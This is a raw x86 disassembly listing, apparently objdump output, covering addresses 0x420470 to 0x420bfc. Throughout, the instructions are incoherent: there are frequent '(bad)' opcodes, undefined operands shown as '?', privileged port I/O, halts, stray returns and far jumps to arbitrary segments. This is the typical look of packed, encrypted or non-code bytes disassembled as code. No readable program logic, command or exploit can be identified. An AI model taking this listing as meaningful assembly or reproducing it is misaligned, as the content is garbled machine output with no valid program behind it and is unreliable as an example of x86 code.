  420470:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420471:	xchg   ecx,eax
  420472:	adc    esi,ecx
  420474:	mov    cl,BYTE PTR [ebx]
  420476:	fidiv  DWORD PTR [ebp-0x74]
  420479:	xchg   edx,eax
  42047a:	outs   dx,DWORD PTR ds:[esi]
  42047b:	stos   BYTE PTR es:[edi],al
  42047c:	xor    eax,0x4f6b766
  420481:	push   es
  420482:	ins    BYTE PTR es:[edi],dx
  420483:	cld    
  420484:	test   eax,0xf4dc0a2f
  420489:	ret    0x493d
  42048c:	mov    bh,0xda
  42048e:	xchg   ecx,eax
  42048f:	fwait
  420490:	dec    ebp
  420491:	stos   BYTE PTR es:[edi],al
  420492:	dec    ecx
  420493:	xor    al,BYTE PTR [eax-0x1c]
  420496:	imul   ecx,ecx,0x3c724250
  42049c:	mov    bl,0x49
  42049e:	(bad)  
  42049f:	cmp    al,0x4f
  4204a1:	sbb    cl,al
  4204a3:	mov    ebx,edx
  4204a5:	repnz cmp dl,BYTE PTR [eax+ebx*1-0x3d]
  4204aa:	fwait
  4204ab:	mov    bl,0xe9
  4204ad:	(bad)  
  4204ae:	aam    0xc7
  4204b0:	pop    ecx
  4204b1:	add    dl,ch
  4204b3:	fnsave [edi]
  4204b5:	sub    eax,0x3d2cb3c2
  4204ba:	ss inc edi
  4204bc:	cmp    ebx,DWORD PTR [edi]
  4204be:	add    eax,0xfae5e425
  4204c3:	push   eax
  4204c4:	ja     0x4204d1
  4204c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204c7:	gs xchg ebp,eax
  4204c9:	outs   dx,BYTE PTR ds:[esi]
  4204ca:	ret    
  4204cb:	fidivr WORD PTR [eax]
  4204cd:	cmp    ebp,esp
  4204cf:	push   si
  4204d1:	retf   
  4204d2:	aad    0xe
  4204d4:	mov    dh,0x6
  4204d6:	mov    edx,0xd6ec31f6
  4204db:	sub    edi,DWORD PTR [eax+edi*4]
  4204de:	xor    ah,BYTE PTR [ebp+0x54]
  4204e1:	adc    eax,0xd41be542
  4204e6:	xchg   ecx,eax
  4204e7:	add    eax,0x8d6cb551
  4204ec:	ins    DWORD PTR es:[edi],dx
  4204ed:	loopne 0x4204d1
  4204ef:	fadd   QWORD PTR [edx-0x491334b1]
  4204f5:	pushf  
  4204f6:	push   ebp
  4204f7:	(bad)  
  4204f8:	(bad)  [ebp-0x7f542380]
  4204fe:	loope  0x420492
  420500:	(bad)  
  420501:	in     eax,dx
  420502:	mov    cl,0x32
  420504:	and    al,0x22
  420506:	dec    esp
  420507:	mov    edx,0x359f5fb4
  42050c:	jne    0x4204b7
  42050e:	out    0x89,al
  420510:	out    0x6e,eax
  420512:	enter  0x440d,0x1a
  420516:	adc    esp,eax
  420518:	in     al,0x5b
  42051a:	mov    al,BYTE PTR [eax]
  42051c:	sbb    DWORD PTR [esi-0x6526c9b7],ebx
  420522:	mov    esp,0xb4ca2dee
  420527:	or     DWORD PTR [ebp-0x15],ebp
  42052a:	sub    eax,0x6380ec69
  42052f:	jp     0x42057d
  420531:	outs   dx,BYTE PTR ds:[esi]
  420532:	stos   BYTE PTR es:[edi],al
  420533:	ret    0x6f81
  420536:	and    ecx,DWORD PTR [edx+0x35a31cea]
  42053c:	jb     0x420510
  42053e:	lods   al,BYTE PTR ds:[esi]
  42053f:	or     dl,cl
  420541:	jae    0x420584
  420543:	jmp    0x504356b2
  420548:	popa   
  420549:	div    BYTE PTR [ecx+0x38]
  42054c:	cmp    al,dl
  42054e:	xchg   edi,eax
  42054f:	or     ch,BYTE PTR [eax]
  420551:	xor    bl,BYTE PTR [eax+0x1c]
  420554:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420555:	adc    ebp,DWORD PTR [edx]
  420557:	pop    esi
  420558:	neg    BYTE PTR [edi+0x2a5a9361]
  42055e:	ret    
  42055f:	shr    DWORD PTR [ebx-0x4d],0x66
  420563:	push   ds
  420564:	jo     0x420500
  420566:	fimul  DWORD PTR [esi-0x5573a09f]
  42056c:	pop    edx
  42056d:	push   ds
  42056e:	hlt    
  42056f:	out    dx,eax
  420570:	retf   0xe7bb
  420573:	and    ebp,DWORD PTR [ebx+0x737fc428]
  420579:	ret    0xe9f
  42057c:	ret    0x4bef
  42057f:	out    0x2a,al
  420581:	(bad)  
  420582:	cld    
  420583:	mov    esi,0x674fb4d3
  420588:	lods   eax,DWORD PTR gs:[esi]
  42058a:	pop    ecx
  42058b:	pop    ecx
  42058c:	jmp    0x89a8:0xd418b442
  420593:	addr16 push eax
  420595:	inc    ebx
  420596:	test   BYTE PTR [edx+0x5c1e5e3f],ch
  42059c:	popf   
  42059d:	sub    eax,0x1640929c
  4205a2:	add    eax,0x2ec99461
  4205a7:	rcr    BYTE PTR [esi+0x22c98652],1
  4205ad:	pop    es
  4205ae:	das    
  4205af:	mov    ?,edi
  4205b1:	test   BYTE PTR [eax],0x6e
  4205b4:	outs   dx,BYTE PTR ds:[esi]
  4205b5:	dec    esp
  4205b6:	mov    bh,BYTE PTR [edx+0x21]
  4205b9:	imul   ecx,DWORD PTR [edi],0xaf843214
  4205bf:	retf   0xcc9d
  4205c2:	int    0x6c
  4205c4:	stos   DWORD PTR es:[edi],eax
  4205c5:	out    0xec,al
  4205c7:	cmp    DWORD PTR [ebp-0x4d],eax
  4205ca:	cmp    DWORD PTR [ebx],edi
  4205cc:	dec    edi
  4205cd:	push   0x6c23d0a6
  4205d2:	adc    eax,0x4a4aec6b
  4205d7:	hlt    
  4205d8:	(bad)  
  4205d9:	out    0x1,al
  4205db:	push   es
  4205dc:	das    
  4205dd:	jo     0x42065d
  4205df:	adc    BYTE PTR [ebp+0x6d],al
  4205e2:	jns    0x420615
  4205e4:	push   ss
  4205e5:	xchg   ecx,eax
  4205e6:	or     BYTE PTR gs:[esi+eiz*4],0xaa
  4205eb:	nop
  4205ec:	fidivr WORD PTR [ecx+0x7c]
  4205ef:	test   BYTE PTR [edx+0x37],ah
  4205f2:	xchg   ebx,eax
  4205f3:	(bad)  
  4205f4:	iret   
  4205f5:	sub    ch,BYTE PTR [eax-0x1a078501]
  4205fb:	gs inc ecx
  4205fd:	mov    WORD PTR [edx-0x4e537254],ds
  420603:	add    edi,ecx
  420605:	mov    dh,0xbb
  420607:	cmp    eax,0x2935df17
  42060c:	nop
  42060d:	xchg   ebp,eax
  42060e:	lds    eax,FWORD PTR [esi]
  420610:	shl    al,0x3b
  420613:	das    
  420614:	and    dl,cl
  420616:	jmp    0xe4b8c60a
  42061b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42061c:	or     DWORD PTR [ecx],edx
  42061e:	inc    ecx
  42061f:	lahf   
  420620:	popf   
  420621:	outs   dx,DWORD PTR ds:[esi]
  420622:	ds jg  0x42060d
  420625:	cmp    esp,esp
  420627:	dec    DWORD PTR ds:0x31f0cf4f
  42062d:	mov    edx,DWORD PTR [esi]
  42062f:	call   0x4c72:0xc953b29
  420636:	stos   BYTE PTR es:[edi],al
  420637:	scas   eax,DWORD PTR es:[edi]
  420638:	push   cs
  420639:	push   0xffffffa5
  42063b:	adc    al,0xd0
  42063d:	xchg   esp,eax
  42063e:	jae    0x4205c2
  420640:	add    edx,DWORD PTR [ebp+0x58bb4184]
  420646:	mov    cl,BYTE PTR [edi]
  420648:	iret   
  420649:	in     al,0xf1
  42064b:	outs   dx,DWORD PTR ds:[esi]
  42064c:	sbb    BYTE PTR [edi+0x78f68fbc],bl
  420652:	out    dx,eax
  420653:	js     0x420640
  420655:	aam    0xd1
  420657:	inc    eax
  420658:	out    0x3b,al
  42065a:	addr16 jns 0x420622
  42065d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42065e:	pop    ebx
  42065f:	clc    
  420660:	addr16 es mov bl,0x1
  420664:	lock outs dx,DWORD PTR ds:[esi]
  420666:	out    0x74,al
  420668:	and    DWORD PTR [ebx-0x27],0xffffff96
  42066c:	cdq    
  42066d:	adc    BYTE PTR [edi],ch
  42066f:	cdq    
  420670:	push   0x8254d3f2
  420675:	scas   eax,DWORD PTR es:[edi]
  420676:	fdivr  DWORD PTR [eax+ecx*4]
  420679:	repz out dx,al
  42067b:	cmp    eax,0x27604e95
  420680:	(bad)  
  420681:	mov    BYTE PTR [ebx+0x11],dl
  420684:	jo     0x4206f7
  420686:	(bad)  
  420687:	imul   edx,DWORD PTR [eax],0x93f871c6
  42068d:	test   eax,0x8b22d88f
  420692:	xor    BYTE PTR [esi-0x373a8452],dh
  420698:	js     0x420645
  42069a:	lock outs dx,DWORD PTR ds:[esi]
  42069c:	leave  
  42069d:	jp     0x420657
  42069f:	xor    ch,bh
  4206a1:	fild   QWORD PTR [esi+edx*4+0x360a26f]
  4206a8:	in     al,dx
  4206a9:	xor    DWORD PTR [eax+0x387af78e],eax
  4206af:	repnz mov al,0xc1
  4206b2:	dec    esi
  4206b3:	jmp    0x420659
  4206b5:	pusha  
  4206b6:	jne    0x420731
  4206b8:	fwait
  4206b9:	outs   dx,BYTE PTR ds:[esi]
  4206ba:	ds cwde 
  4206bc:	daa    
  4206bd:	and    BYTE PTR [edi-0x2d493f],0xcd
  4206c4:	adc    DWORD PTR [edx+ebp*8+0x4d],ecx
  4206c8:	stc    
  4206c9:	cmp    esi,DWORD PTR [ecx+ebx*1]
  4206cc:	jb     0x420731
  4206ce:	clc    
  4206cf:	pop    ebx
  4206d0:	xchg   esi,eax
  4206d1:	icebp  
  4206d2:	(bad)  
  4206d3:	dec    edx
  4206d4:	fcomp  QWORD PTR [eax]
  4206d6:	inc    edi
  4206d7:	ja     0x4206a3
  4206d9:	ret    0x890
  4206dc:	(bad)  
  4206dd:	sbb    edi,DWORD PTR [eax]
  4206df:	cmp    DWORD PTR ds:0x25e070a,esi
  4206e5:	mov    ebp,ds
  4206e7:	sub    al,0xb7
  4206e9:	mov    ch,0x1d
  4206eb:	sahf   
  4206ec:	cmp    DWORD PTR [edi],ecx
  4206ee:	add    eax,0xc6f9095e
  4206f3:	xchg   esi,eax
  4206f4:	call   0x5892a386
  4206f9:	stos   BYTE PTR es:[edi],al
  4206fa:	add    al,0x96
  4206fc:	hlt    
  4206fd:	rcr    BYTE PTR ds:0xfe598480,0x6f
  420704:	outs   dx,BYTE PTR ds:[esi]
  420705:	xchg   edx,eax
  420706:	cmp    bh,BYTE PTR [edi+0x6a]
  420709:	aaa    
  42070a:	jb     0x420696
  42070c:	sub    BYTE PTR [ebx+eiz*8],al
  42070f:	push   esp
  420710:	xor    bh,BYTE PTR [ebx-0x79]
  420713:	stc    
  420714:	jno    0x42078e
  420716:	popa   
  420717:	adc    DWORD PTR [ebx+0x77b880c8],ebp
  42071d:	frstorw [edi+0x35]
  420721:	clc    
  420722:	mov    ?,WORD PTR [ecx]
  420724:	pop    esp
  420725:	mov    WORD PTR ds:0x4d5df8c5,ss
  42072b:	sbb    BYTE PTR [esi],0x8f
  42072e:	sbb    eax,0x59238580
  420733:	add    edi,edi
  420735:	xchg   esi,eax
  420736:	stc    
  420737:	jp     0x420792
  420739:	dec    ecx
  42073a:	test   BYTE PTR [edx],ch
  42073c:	jb     0x4206f0
  42073e:	inc    esp
  42073f:	sbb    bl,BYTE PTR [esi-0x5f5901a7]
  420745:	xor    eax,0xb37d8cca
  42074a:	daa    
  42074b:	ss scas al,BYTE PTR es:[edi]
  42074d:	scas   eax,DWORD PTR es:[edi]
  42074e:	xor    DWORD PTR [ecx+0x30],ebp
  420751:	pop    esp
  420752:	mov    ds:0xdcdd02c0,al
  420757:	stos   DWORD PTR es:[edi],eax
  420758:	and    edi,0x1b
  42075b:	inc    ebx
  42075c:	popa   
  42075d:	pushw  cs
  42075f:	xchg   edx,eax
  420760:	sar    eax,1
  420762:	pop    DWORD PTR [ecx+0x3094ba7b]
  420768:	imul   ebx,DWORD PTR [edi-0x69],0x2f
  42076c:	test   BYTE PTR ds:0x1356f3f4,bh
  420772:	cli    
  420773:	xor    esi,ecx
  420775:	out    0xc0,al
  420777:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420778:	mov    eax,0xb9b7a206
  42077d:	sbb    dl,BYTE PTR [ebx+0xd]
  420780:	sub    BYTE PTR cs:[ecx],bh
  420783:	fist   WORD PTR [edx+0xb]
  420786:	js     0x42073f
  420788:	add    ebp,edi
  42078a:	stc    
  42078b:	mov    DWORD PTR [eax+0x4c],eax
  42078e:	mov    dh,ah
  420790:	pop    edi
  420791:	outs   dx,DWORD PTR ds:[esi]
  420792:	lock int3 
  420794:	int    0xa2
  420796:	hlt    
  420797:	jb     0x42073f
  420799:	and    dh,BYTE PTR [ebx]
  42079b:	xor    eax,DWORD PTR [edi]
  42079d:	loopne 0x420806
  42079f:	fst    QWORD PTR [ecx]
  4207a1:	jbe    0x4207ae
  4207a3:	sbb    BYTE PTR [ebp-0x1822babd],cl
  4207a9:	(bad)
  4207ac:	lock cwde 
  4207ae:	mov    BYTE PTR [esi],bh
  4207b0:	cmp    eax,0xd76c0a08
  4207b5:	sub    al,0xc8
  4207b7:	rsm    
  4207b9:	sub    esi,DWORD PTR [ecx]
  4207bb:	jp     0x420817
  4207bd:	int3   
  4207be:	(bad)  
  4207bf:	dec    esi
  4207c0:	repnz bound ebx,QWORD PTR [ebx+0x13]
  4207c4:	aad    0x31
  4207c6:	(bad)  [edi+0x5a9fabe0]
  4207cc:	push   edx
  4207cd:	push   ebx
  4207ce:	aam    0x98
  4207d0:	sbb    al,0xe3
  4207d2:	or     BYTE PTR [edi+ebx*8-0x7857905e],dl
  4207d9:	xor    eax,0x172c926
  4207de:	push   0xf6bca21e
  4207e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207e4:	call   0xd63a:0x93cf2d6f
  4207eb:	test   BYTE PTR [edi-0x6edbf3b6],ch
  4207f1:	pop    ds
  4207f2:	adc    eax,0xcc56ecf
  4207f7:	into   
  4207f8:	xrelease xchg DWORD PTR gs:[ebx+0x4a099f08],esp
  420800:	mov    edx,edi
  420802:	xchg   ebx,eax
  420803:	jmp    0xed6aa78e
  420808:	das    
  420809:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42080a:	cmp    edi,ebx
  42080c:	mov    dh,0xa5
  42080e:	in     al,0xc
  420810:	add    bl,ah
  420812:	hlt    
  420813:	and    ah,BYTE PTR [ecx+esi*1+0x4cbbd41a]
  42081a:	in     al,dx
  42081b:	xchg   eax,esi
  42081d:	loope  0x4207a5
  42081f:	out    dx,al
  420820:	arpl   WORD PTR [edx-0x29007cbd],sp
  420826:	sbb    bh,BYTE PTR [edi+ecx*4]
  420829:	xchg   bh,bh
  42082b:	fcmovnb st,st(0)
  42082d:	sbb    al,0x3a
  42082f:	ret    0x54fe
  420832:	cwde   
  420833:	sbb    al,0xf8
  420835:	ret    
  420836:	fsub   DWORD PTR [edi]
  420838:	test   eax,0x46a1a897
  42083d:	mov    eax,0x30075c8f
  420842:	sar    esp,cl
  420844:	gs push edx
  420846:	xchg   ebp,eax
  420847:	or     eax,0x91e9ba8d
  42084c:	popf   
  42084d:	xchg   edi,eax
  42084e:	hlt    
  42084f:	xor    al,BYTE PTR [ecx]
  420851:	or     DWORD PTR [eax-0x34c6d47b],ebp
  420857:	minps  xmm4,XMMWORD PTR [edx-0x67511d2f]
  42085e:	xchg   edx,eax
  42085f:	ret    0xd281
  420862:	push   esi
  420863:	aaa    
  420864:	mov    WORD PTR [ebp-0xc],gs
  420867:	pop    esi
  420868:	lods   eax,DWORD PTR ds:[esi]
  420869:	push   edi
  42086a:	outs   dx,BYTE PTR ds:[esi]
  42086b:	rcl    DWORD PTR [ebx+edx*4+0x335cbf7b],cl
  420872:	or     BYTE PTR [ecx-0x15a54720],cl
  420878:	lea    esp,[ebp+edi*1-0x20]
  42087c:	and    esp,DWORD PTR [ebp+0x5a]
  42087f:	mov    esi,0x209cec78
  420884:	fsub   QWORD PTR [edx+esi*2]
  420887:	cs out 0x90,eax
  42088a:	arpl   WORD PTR [edx],ax
  42088c:	sbb    BYTE PTR [edx-0x67541f61],dl
  420892:	mov    ebx,0xcefb5394
  420897:	xchg   BYTE PTR [esp+esi*8-0x80],bh
  42089b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42089c:	xor    esp,DWORD PTR [ebx-0x38]
  42089f:	fcom   QWORD PTR [edx-0x69]
  4208a2:	add    ch,ch
  4208a4:	xor    dl,al
  4208a6:	je     0x420877
  4208a8:	push   esp
  4208a9:	dec    ebx
  4208aa:	inc    esp
  4208ab:	popa   
  4208ac:	xchg   esp,eax
  4208ad:	in     eax,0x5f
  4208af:	loope  0x4208e0
  4208b1:	push   ebx
  4208b2:	sub    BYTE PTR [esp+esi*2],ch
  4208b5:	and    eax,0x33d8b27b
  4208ba:	fst    QWORD PTR [eax+eiz*1-0x50]
  4208be:	dec    ebx
  4208bf:	(bad)  
  4208c0:	push   esi
  4208c1:	mov    esp,0xfd193de0
  4208c6:	cmp    eax,0x25f96c7b
  4208cb:	les    edi,FWORD PTR [esi]
  4208cd:	sub    ch,BYTE PTR [ebp+0x5b]
  4208d0:	retf   
  4208d1:	sbb    BYTE PTR [ecx],0x4d
  4208d4:	imul   esp,ebx,0xffffffd1
  4208d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208d8:	je     0x420940
  4208da:	xor    esp,DWORD PTR [edi+0x5c20f5f4]
  4208e0:	cmc    
  4208e1:	cld    
  4208e2:	inc    ebp
  4208e3:	fwait
  4208e4:	sub    al,BYTE PTR [edi]
  4208e6:	xchg   edi,eax
  4208e7:	dec    esp
  4208e8:	mov    WORD PTR [eax],fs
  4208ea:	inc    ecx
  4208eb:	retf   
  4208ec:	jno    0x42093a
  4208ee:	sahf   
  4208ef:	mov    eax,0x23790ca1
  4208f4:	xchg   ebp,eax
  4208f5:	sbb    BYTE PTR [ebp-0x5],cl
  4208f8:	inc    ebx
  4208f9:	sub    DWORD PTR [eax+0x57],0x9c636d6a
  420900:	rcr    BYTE PTR [ebx-0x19ac2be6],1
  420906:	arpl   WORD PTR [esi-0xd0b4ddf],bp
  42090c:	in     al,0x35
  42090e:	outs   dx,DWORD PTR ds:[esi]
  42090f:	aas    
  420910:	push   ebp
  420911:	call   0x56e25735
  420916:	cli    
  420917:	(bad)  
  420918:	pop    ebp
  420919:	(bad)  [edx+0x54]
  42091c:	in     eax,0x27
  42091e:	xchg   ebx,eax
  42091f:	and    dx,bx
  420922:	fnstcw WORD PTR [ecx+0x3f537005]
  420928:	mov    ch,0x2d
  42092a:	mov    ebp,0x6ff6df72
  42092f:	les    edx,FWORD PTR [ebp+0x16781a02]
  420935:	and    dl,BYTE PTR [ecx]
  420937:	fnsave [edi]
  420939:	ret    0x518d
  42093c:	std    
  42093d:	adc    DWORD PTR [esi+0x25],ebx
  420940:	outs   dx,DWORD PTR ds:[esi]
  420941:	and    al,0x27
  420943:	jmp    0xb9b7:0x9b73d4cf
  42094a:	dec    esi
  42094b:	sub    ebp,0x68
  42094e:	or     ebx,DWORD PTR [edi+0x685f0e04]
  420954:	int    0x48
  420956:	mov    eax,ds:0x7e6cf2
  42095b:	dec    ebx
  42095c:	xchg   edi,eax
  42095d:	mov    esi,0xc4a200b2
  420962:	push   edx
  420963:	mov    cl,0x3a
  420965:	je     0x4209bb
  420967:	cli    
  420968:	or     eax,0x8ccab189
  42096d:	mov    DWORD PTR [ecx+0x3a],eax
  420970:	sbb    dh,BYTE PTR [eax]
  420972:	(bad)  
  420973:	push   cs
  420974:	push   edi
  420975:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420976:	fstp   QWORD PTR [ebp+ebp*4-0x31]
  42097a:	ror    BYTE PTR [ecx+esi*4+0x1ead1b0b],1
  420981:	mov    ebx,0xc1b39add
  420986:	ret    
  420987:	fs jl  0x420a01
  42098a:	sbb    BYTE PTR [esp+eiz*8],bl
  42098d:	push   ebx
  42098e:	(bad)  
  42098f:	pushf  
  420990:	adc    al,0x31
  420992:	iret   
  420993:	dec    ebp
  420994:	sbb    ebx,ecx
  420996:	xchg   esi,eax
  420997:	inc    eax
  420998:	outs   dx,BYTE PTR ds:[esi]
  420999:	fistp  DWORD PTR [edx-0x63b04921]
  42099f:	sbb    edx,edi
  4209a1:	sub    bh,ah
  4209a3:	retf   0x6919
  4209a6:	imul   ecx,DWORD PTR [edx+0x73],0xb332669f
  4209ad:	std    
  4209ae:	shl    DWORD PTR [edx-0x8],0x35
  4209b2:	push   ds
  4209b3:	sbb    bl,ah
  4209b5:	cmp    esi,DWORD PTR ds:0xbbe2ff06
  4209bb:	in     al,0x91
  4209bd:	xchg   DWORD PTR [edi+eax*8-0x1312783f],esi
  4209c4:	jbe    0x420973
  4209c6:	mov    edi,0x56eb42c1
  4209cb:	in     al,dx
  4209cc:	add    dl,al
  4209ce:	and    al,0x7b
  4209d0:	push   ds
  4209d1:	out    0xcd,eax
  4209d3:	jbe    0x4209b6
  4209d5:	sub    esp,esi
  4209d7:	nop
  4209d8:	hlt    
  4209d9:	add    BYTE PTR [ebx-0x60080da3],cl
  4209df:	fidivr DWORD PTR [eax+0x66]
  4209e2:	punpckhbw mm6,QWORD PTR [ecx+0x2042cce7]
  4209e9:	ret    
  4209ea:	pop    esp
  4209eb:	fisub  DWORD PTR [edi]
  4209ed:	sub    eax,0x734d8a75
  4209f2:	push   0xd2a651ae
  4209f7:	xchg   ebx,eax
  4209f8:	mov    ds:0x3ccdf32,eax
  4209fd:	retf   0xc9fd
  420a00:	dec    edi
  420a01:	retf   
  420a02:	jnp    0x4209e1
  420a04:	pop    ebp
  420a05:	sti    
  420a06:	(bad)  
  420a07:	sub    ch,BYTE PTR [ecx+0x6aa66833]
  420a0d:	xchg   BYTE PTR [eax+ebp*2],bh
  420a10:	jmp    0x4209d4
  420a12:	mov    edx,fs
  420a14:	clc    
  420a15:	dec    edx
  420a16:	int3   
  420a17:	sbb    eax,0x2aa79efb
  420a1c:	jae    0x4209e2
  420a1e:	add    cl,BYTE PTR [ecx]
  420a20:	dec    esi
  420a21:	sub    al,0x95
  420a23:	pushf  
  420a24:	add    al,0x4e
  420a26:	fwait
  420a27:	pushf  
  420a28:	das    
  420a29:	xchg   BYTE PTR fs:[ebx],ch
  420a2c:	and    BYTE PTR [edx-0x2dfc788f],ah
  420a32:	xor    al,0xaf
  420a34:	xlat   BYTE PTR ds:[ebx]
  420a35:	jb     0x420a56
  420a37:	push   edi
  420a38:	dec    ebp
  420a39:	mov    ds:0x638600de,al
  420a3e:	ins    BYTE PTR es:[edi],dx
  420a3f:	mov    ch,0xc1
  420a41:	ins    DWORD PTR es:[edi],dx
  420a42:	in     eax,dx
  420a43:	test   DWORD PTR [edi-0x70cb9185],ebp
  420a49:	pop    es
  420a4a:	inc    esi
  420a4b:	gs ror dh,1
  420a4e:	ret    
  420a4f:	lock pusha 
  420a51:	repnz push edi
  420a53:	sbb    eax,0xffc3c500
  420a58:	or     BYTE PTR [ebx],dl
  420a5a:	and    BYTE PTR [esi],bh
  420a5c:	mov    cl,0x76
  420a5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a5f:	pop    ds
  420a60:	fimul  WORD PTR [ecx-0x1d29c79c]
  420a66:	and    DWORD PTR [ecx],ebp
  420a68:	push   ss
  420a69:	push   eax
  420a6a:	pop    ss
  420a6b:	lock fwait
  420a6d:	cmp    bl,ah
  420a6f:	outs   dx,BYTE PTR ds:[esi]
  420a70:	jg     0x420ae4
  420a72:	ins    BYTE PTR es:[edi],dx
  420a73:	xchg   ebx,eax
  420a74:	push   cs
  420a75:	sbb    BYTE PTR ds:0x39e52146,bl
  420a7b:	fwait
  420a7c:	sbb    eax,0xdaab1d3c
  420a81:	push   0x204944e9
  420a86:	and    eax,0x5adbc167
  420a8b:	stos   DWORD PTR es:[edi],eax
  420a8c:	pushf  
  420a8d:	inc    eax
  420a8e:	mov    cs,WORD PTR [esp+ebp*2+0x71]
  420a92:	dec    ebx
  420a93:	fwait
  420a94:	lahf   
  420a95:	xor    DWORD PTR [esi+eiz*2],ecx
  420a98:	(bad)
  420a9d:	jp     0x420acb
  420a9f:	pop    ebx
  420aa0:	xchg   ebp,eax
  420aa1:	aaa    
  420aa2:	push   0xffffff8b
  420aa4:	cmp    bh,BYTE PTR [ebx]
  420aa6:	addr16 xor eax,0xa5f32bae
  420aac:	cmp    al,0xf0
  420aae:	or     dh,dl
  420ab0:	push   0x74
  420ab2:	sbb    ecx,edx
  420ab4:	(bad)  
  420ab5:	push   0x2ce6ef5e
  420aba:	ret    0x93a0
  420abd:	ficom  WORD PTR [ebx-0x49]
  420ac0:	and    ebp,eax
  420ac2:	xchg   ebp,eax
  420ac3:	data16 jge 0x420b03
  420ac6:	fsubr  QWORD PTR [ebx+0xc]
  420ac9:	push   ss
  420aca:	or     eax,DWORD PTR [ebp-0x3b]
  420acd:	push   edi
  420ace:	dec    esp
  420acf:	aas    
  420ad0:	into   
  420ad1:	ret    
  420ad2:	adc    DWORD PTR [ebp-0x29],ebp
  420ad5:	push   cs
  420ad6:	push   edx
  420ad7:	add    edi,ecx
  420ad9:	add    esp,DWORD PTR [ecx-0x3ebe8cd0]
  420adf:	test   DWORD PTR [edi],edi
  420ae1:	dec    ebp
  420ae2:	rcr    DWORD PTR [ecx],cl
  420ae4:	inc    edi
  420ae5:	arpl   WORD PTR [edi+0x5f],bp
  420ae8:	add    bl,dh
  420aea:	push   0x65
  420aec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420aed:	fdivrp st(4),st
  420aef:	push   esp
  420af0:	or     edi,ecx
  420af2:	out    0x47,al
  420af4:	cdq    
  420af5:	pop    edi
  420af6:	pushw  0xe94c
  420afa:	pop    ecx
  420afb:	pop    es
  420afc:	test   bl,0x91
  420aff:	xor    al,0x53
  420b01:	clc    
  420b02:	ret    0xcc3f
  420b05:	stos   DWORD PTR es:[edi],eax
  420b06:	ret    0xeac
  420b09:	or     eax,0x40524223
  420b0e:	in     al,dx
  420b0f:	sbb    ch,BYTE PTR [esi-0x45]
  420b12:	sub    al,0x96
  420b14:	sbb    DWORD PTR [ebx],edx
  420b16:	aam    0xb
  420b18:	jne    0x420ad5
  420b1a:	or     ah,BYTE PTR [edx]
  420b1c:	arpl   WORD PTR [eax],cx
  420b1e:	jae    0x420b01
  420b20:	cdq    
  420b21:	ret    
  420b22:	inc    esp
  420b23:	inc    ecx
  420b24:	or     bh,BYTE PTR [edx-0x72]
  420b27:	mov    bh,0xd4
  420b29:	cmp    ecx,ecx
  420b2b:	scas   al,BYTE PTR es:[edi]
  420b2c:	jmp    0x8b95:0x14973d8a
  420b33:	fucomip st,st(2)
  420b35:	mov    BYTE PTR [ebx-0x26],ah
  420b38:	mov    edx,0x61f9ceab
  420b3d:	mul    BYTE PTR [edx-0x5c]
  420b40:	adc    cl,cl
  420b42:	jmp    0x420acf
  420b44:	jge    0x420b90
  420b46:	enter  0x19ec,0xd7
  420b4a:	and    eax,ebp
  420b4c:	stos   BYTE PTR es:[edi],al
  420b4d:	imul   ebx,DWORD PTR [ebx-0x71],0x1b4fb00c
  420b54:	lock mov esp,0x50442f18
  420b5a:	mov    ds,WORD PTR [esi+0x1834bab0]
  420b60:	sbb    cl,BYTE PTR [edx]
  420b62:	push   eax
  420b63:	retf   0xd1da
  420b66:	and    BYTE PTR [ecx+0x4943316f],bl
  420b6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b6d:	shl    edi,cl
  420b6f:	inc    ecx
  420b70:	outs   dx,DWORD PTR ds:[esi]
  420b71:	jne    0x420b1b
  420b73:	in     al,0x1c
  420b75:	pop    ebp
  420b76:	sub    DWORD PTR [ecx+0x12],esi
  420b79:	push   cs
  420b7a:	(bad)  
  420b7b:	cld    
  420b7c:	popf   
  420b7d:	das    
  420b7e:	sub    BYTE PTR [edx],0xf8
  420b81:	repz ret 0x9508
  420b85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b86:	(bad)  
  420b87:	xlat   BYTE PTR ds:[ebx]
  420b88:	fild   WORD PTR [edi-0x4d88d68]
  420b8e:	test   al,0xd7
  420b90:	je     0x420b93
  420b92:	push   esi
  420b93:	jl     0x420bb4
  420b95:	jae    0x420bbf
  420b97:	dec    ebx
  420b98:	mov    esi,0xe4435f3f
  420b9d:	dec    edi
  420b9e:	arpl   WORD PTR [ebp-0x4b2007ae],sp
  420ba4:	pop    ecx
  420ba5:	xchg   esi,eax
  420ba6:	and    DWORD PTR [ecx-0x10710c3f],esp
  420bac:	aad    0xa4
  420bae:	or     esp,ecx
  420bb0:	adc    edi,DWORD PTR [esi+0x714ac121]
  420bb6:	sub    eax,0xdf5c5330
  420bbb:	xor    DWORD PTR [ebp+0x4a],0x9aac583a
  420bc2:	enter  0x38a9,0x88
  420bc6:	sbb    BYTE PTR [ecx+0x7b1be0c8],dl
  420bcc:	retf   0x9caa
  420bcf:	or     DWORD PTR [edi+0x3c],ebx
  420bd2:	push   cs
  420bd3:	cmp    cl,BYTE PTR [eax]
  420bd5:	out    0x40,eax
  420bd7:	int3   
  420bd8:	mov    ah,BYTE PTR [edx+edi*4]
  420bdb:	cld    
  420bdc:	es jecxz 0x420bbc
  420bdf:	shl    DWORD PTR [ecx+0x3742a9b3],1
  420be5:	fwait
  420be6:	in     al,dx
  420be7:	and    BYTE PTR [edx],dh
  420be9:	and    eax,0xf9f946e6
  420bee:	je     0x420c0c
  420bf0:	leave  
  420bf1:	pop    ecx
  420bf2:	pop    eax
  420bf3:	xchg   edx,eax
  420bf4:	mov    ecx,0x3fa45e60
  420bf9:	or     DWORD PTR [ecx+edi*1],eax
  420bfc:	test   eax,0xc3749ab9
